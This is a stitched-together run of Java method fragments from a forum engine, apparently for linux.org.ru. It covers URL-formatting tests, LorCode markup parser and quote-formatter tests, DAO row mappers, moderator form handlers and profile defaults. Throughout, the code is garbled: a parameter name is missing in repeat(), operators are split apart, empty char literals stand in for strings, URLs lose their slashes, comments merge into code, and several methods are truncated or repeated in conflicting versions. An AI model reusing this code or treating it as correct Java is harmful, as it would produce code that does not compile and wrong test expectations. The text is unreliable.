http:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . fixScheme ( true ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , true ) ) ; } 
public static String repeat ( String s , int ) { if ( s = = null ) return null ; if ( < = 0 ) return s ; final StringBuilder sb = new StringBuilder ( s . length ( ) * ) ; for ( int i = 0 ; i < ; i + + ) { sb . append ( s ) ; } return sb . toString ( ) ; } 
public void testToHtmlFormatter ( ) { assertEquals ( RESULT1 , toHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , toHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , toHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , toHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , toHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , toHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , toHtmlFormatter . format ( TEXT11 , false ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public void testCrash ( ) { try { assertEquals ( " &quot;<a href= \" http:www.google.com/&quot; \" >www.google.com/&quot;</a> " , 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new RegisterRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean supports ( Class < ? > aClass ) { return RegisterRequest . class . equals ( aClass ) ; } 
public ModelAndView showForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " setpostscore " ) ; Message message = messageDao . getById ( msgid ) ; mv . addObject ( " message " , message ) ; mv . addObject ( " group " , groupDao . getGroup ( message . getGroupId ( ) ) ) ; return mv ; } 
public void resetUnreadReplies ( User user ) { jdbcTemplate . update ( updateResetUnreadReplies , user . getId ( ) ) ; jdbcTemplate . update ( " UPDATE user_events SET unread=false WHERE userid=? " , user . getId ( ) ) ; } 
public String formatUrlBody ( int maxLength ) throws URIException { String all = lorURI . getURIReference ( ) ; String scheme = lorURI . getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( isTrueLorUrl ) { if ( uriWithoutScheme . length ( ) < maxLength ) { 
public TrackerItem mapRow ( ResultSet resultSet , int i ) throws SQLException { User author , lastCommentBy ; int msgid , cid , pages ; Timestamp lastmod , postdate ; int stat1 , stat3 , stat4 ; int groupId , section ; String groupTitle , groupUrlName ; String title ; String type ; boolean resolved , uncommited ; try { author = userDao . getUserCached ( resultSet . getInt ( " author " ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; title = resultSet . getString ( " title " ) ; cid = resultSet . getInt ( " cid " ) ; try { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Message . getPageCount ( stat1 , messagesInPage ) ; type = resultSet . getString ( " type " ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , title , cid , lastCommentBy , resolved , 
public boolean isWikiArticle ( ) { return isWiki ( ) & & ! title . startsWith ( " Comments: " ) ; } 
public boolean isWikiComment ( ) { return isWiki ( ) & & title . startsWith ( " Comments: " ) ; } 
public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) throws Exception { CommonsLogStopWatch watch = new CommonsLogStopWatch ( request . getRequestURI ( ) ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return true ; } 
public void postHandle ( HttpServletRequest request , HttpServletResponse response , Object handler , ModelAndView modelAndView ) throws Exception { StopWatch stopWatch = ( StopWatch ) request . getAttribute ( ATTRIBUTE ) ; stopWatch . stop ( ) ; } 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int topics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " topics " , topics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; String partFilter ; String partWiki = " " ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) throws Exception { CommonsLogStopWatch watch = new CommonsLogStopWatch ( handler . getClass ( ) . getSimpleName ( ) ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return true ; } 
public void urlParameterQuotesTest ( ) { assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url=http:www.example.com \" ]example[/url] " , false ) ) ; assertEquals ( " <p><a href= \" http:www.example.com \" >example</a></p> " , lorCodeService . parseComment ( " [url= \" http:www.example.com \" ]example[/url] " , false ) ) ; 
public void autoLinksInList ( ) { assertEquals ( " <ul><li><a href= \" http:www.example.com \" >http:www.example.com</a></li><li>sure</li><li>profit!</li></ul> " , lorCodeService . parseComment ( " [list][*]www.example.com[*]sure[*]profit![/list] " , false ) ) ; 
public void codeTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/code] " , false ) ) ; Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[list][*]one[*]two[*]three[/list][/code] " , false ) ) ; 
public ModelAndView moveTopicForm ( ServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } ModelAndView mv = new ModelAndView ( " mtn " ) ; Message message = messageDao . getById ( msgid ) ; Section section = sectionDao . getSection ( message . getSectionId ( ) ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " groups " , groupDao . getGroups ( section ) ) ; return mv ; } 
private String processMessage ( String msg , String mode ) { if ( msg = = null ) { return " " ; } if ( " lorcode " . equals ( mode ) ) { return msg ; 
public void addUserRefEvent ( User [ ] refs , int topic , int comment ) { if ( refs . length = = 0 ) { return ; } Map < String , Object > [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " type " , " REF " , " private " , false , " message_id " , topic , " comment_id " , comment ) ; } insert . executeBatch ( batch ) ; } 
public void addUserRefEvent ( User [ ] refs , int topic ) { if ( refs . length = = 0 ) { return ; } Map < String , Object > [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " type " , " REF " , " private " , false , " message_id " , topic ) ; } insert . executeBatch ( batch ) ; } 
public void quoteTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote]hello world[/quote] " , false ) , " <div class= \" quote \" ><p>hello world</p></div> " ) ; } 
public void overflow1Test ( ) { Assert . assertEquals ( " <p>ololo</p><div class= \" quote \" ><p><i>hz</i></p></div> " , lorCodeService . parseComment ( " ololo[quote][i]hz[/i][/quote] " , false ) ) ; 
public void paragraphLogicTest ( ) { list Assert.assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false)); b Assert.assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false)); i Assert.assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false)); u Assert.assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false)); s Assert.assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false)); em Assert.assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false)); strong Assert.assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false)); p Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false)); div Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false)); quote Assert.assertEquals("<div class=\"quote\"><p>te</p><p>xt</p></div>", lorCodeService.parseComment("[quote]text[/quote]", false)); cut Assert.assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false)); user Assert.assertEquals("<p><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[user]splinter[/user]", false)); 
public List < TrackerItem > getTrackAll ( TrackerFilter filter , User currentUser , Timestamp interval , int topics , int offset , final int messagesInPage ) { MapSqlParameterSource parameter = new MapSqlParameterSource ( ) ; parameter . addValue ( " interval " , interval ) ; parameter . addValue ( " topics " , topics ) ; parameter . addValue ( " offset " , offset ) ; String partIgnored ; String partFilter ; String partWiki = queryPartWiki ; if ( currentUser ! = null ) { partIgnored = queryPartIgnored ; parameter . addValue ( " userid " , currentUser . getId ( ) ) ; } else { partIgnored = " " ; } switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case TECH : partFilter = queryPartTech ; break ; case MINE : if ( currentUser ! = null ) { partFilter = queryPartMine ; partWiki = queryPartWikiMine ; } else { partFilter = " " ; } break ; default : partFilter = " " ; } String query = String . format ( queryTrackerMain , partIgnored , partFilter , partIgnored , partFilter , partWiki ) ; return jdbcTemplate . query ( query , parameter , new RowMapper < TrackerItem > ( ) { @Override 
public void quoteParamTest ( ) { Assert . assertEquals ( lorCodeService . parseComment ( " [quote=maxcom]hello world[/quote] " , false ) , " <div class= \" quote \" ><p><cite>maxcom</cite></p><p>hello world</p></div> " ) ; } 
public void testToHtmlFormatter ( ) { assertEquals ( RESULT1 , toHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , toHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , toHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , toHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , toHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , toHtmlFormatter . format ( TEXT10 , false ) ) ; assertEquals ( RESULT11 , toHtmlFormatter . format ( TEXT11 , false ) ) ; assertEquals ( RESULT12 , toHtmlFormatter . format ( TEXT12 , false ) ) ; assertEquals ( RESULT13 , toHtmlFormatter . format ( TEXT13 , false ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public void addReplyEvent ( User parentAuthor , int topicId , int commentId ) { insert . execute ( ImmutableMap . < String , Object > of ( " userid " , parentAuthor . getId ( ) , 
private String fixNL ( String text ) { return text . replaceAll ( NL_REGEXP , " [br] " ) ; } 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; buf . append ( " [br] " ) ; } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; buf . append ( " [br] " ) ; } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; buf . append ( " [br] " ) ; } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; buf . append ( '' ) ; } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
public void testToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , toLorCodeTexFormatter . format ( QUOTING1 , true ) ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , toLorCodeTexFormatter . format ( QUOTING1 , false ) ) ; assertEquals ( RESULT_QUOTING2 , toLorCodeTexFormatter . format ( QUOTING2 , true ) ) ; assertEquals ( RESULT_QUOTING3 , toLorCodeTexFormatter . format ( QUOTING3 , true ) ) ; assertEquals ( " [quote]test[br][/quote]test " , toLorCodeTexFormatter . format ( " >test ntest " , true ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest", true)); 1 assertEquals("test[quote]test[br][/quote]", toLorCodeTexFormatter.format("test>test", true)); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &", true)); 8 assertEquals("test[br]test[br]", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test[br]", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[quote]test[br][/quote]test[br]", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[quote]test[br]test[br][/quote]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void testToLorCodeTexFormatter2 ( ) { int i ; String [ ] tex = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb = { " [quote]one[br][/quote] " , " [quote]one[br]one[br][/quote] " , " [quote][quote]one[br][/quote]teo[br][/quote] " , " due>>one n[quote]teo[br]neo[br][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf? nok " , " [quote]one[br]one[br][/quote] " , } ; String [ ] html = { " <div class= \" quote \" ><p>one<br></p></div> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf? nok n</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf? nok n</p> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , } ; for ( i = 0 ; i < tex . length ; i + + ) { String entry = tex [ i ] ; 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " tango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , true ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , true ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put(MAIN_3COLUMNS_PROPERTY, Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put(BOXES_MAIN31_PROPERTY, boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put(BOXES_MAIN32_PROPERTY, boxes32); return defaults; } 
public boolean isShowSocial ( ) { return showSocial ; } 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; buf . append ( " [br] " ) ; } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; buf . append ( " [br] " ) ; } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
public void testToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , toLorCodeTexFormatter . format ( QUOTING1 , true ) ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , toLorCodeTexFormatter . format ( QUOTING1 , false ) ) ; assertEquals ( RESULT_QUOTING2 , toLorCodeTexFormatter . format ( QUOTING2 , true ) ) ; assertEquals ( RESULT_QUOTING3 , toLorCodeTexFormatter . format ( QUOTING3 , true ) ) ; assertEquals ( " [quote]test[br][/quote]test " , toLorCodeTexFormatter . format ( " >test ntest " , true ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest", true)); 1 assertEquals("test[quote]test[br][/quote]", toLorCodeTexFormatter.format("test>test", true)); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &", true)); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[quote]test[br][/quote]test", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[quote]test[br]test[br][/quote]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void testToLorCodeTexFormatter2 ( ) { int i ; String [ ] text = { " >one " , " >one n>one " , " >>one n>teo " , " due>>one n>teo n>>neo nwuf? nok " , " due n>>one n>teo n>>neo nwuf? nok " , " >one n>one " , } ; String [ ] bb_tex = { " [quote]one[br][/quote] " , " [quote]one[br]one[br][/quote] " , " [quote][quote]one[br][/quote]teo[br][/quote] " , " due>>one n[quote]teo[br]neo[br][/quote]wuf? nok " , " due n[quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf? nok " , " [quote]one[br]one[br][/quote] " , } ; String [ ] bb = { " [quote]one[br][/quote] " , " [quote]one[br]one[br][/quote] " , " [quote][quote]one[br][/quote]teo[br][/quote] " , " due>>one[br][quote]teo[br]neo[br][/quote]wuf?[br]ok " , " due[br][quote][quote]one[br][/quote]teo[br]neo[br][/quote]wuf?[br]ok " , " [quote]one[br]one[br][/quote] " , } ; String [ ] html_tex = { " <div class= \" quote \" ><p>one<br></p></div> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p></div> " , " <p>due&gt;&gt;one n</p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <p>due n</p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf? nok</p> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , } ; String [ ] html = { " <div class= \" quote \" ><p>one<br></p></div> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , " <div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br></p></div> " , " <p>due&gt;&gt;one<br></p><div class= \" quote \" ><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <p>due<br></p><div class= \" quote \" ><div class= \" quote \" ><p>one<br></p></div><p>teo<br>neo<br></p></div><p>wuf?<br>ok</p> " , " <div class= \" quote \" ><p>one<br>one<br></p></div> " , } ; for ( i = 0 ; i < text . length ; i + + ) { String entry = text [ i ] ; 
protected String quote ( String text ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = text . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel = = 0 ) { buf . append ( " [br] " ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( line . substring ( nestingLevel ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . toString ( ) ; } 
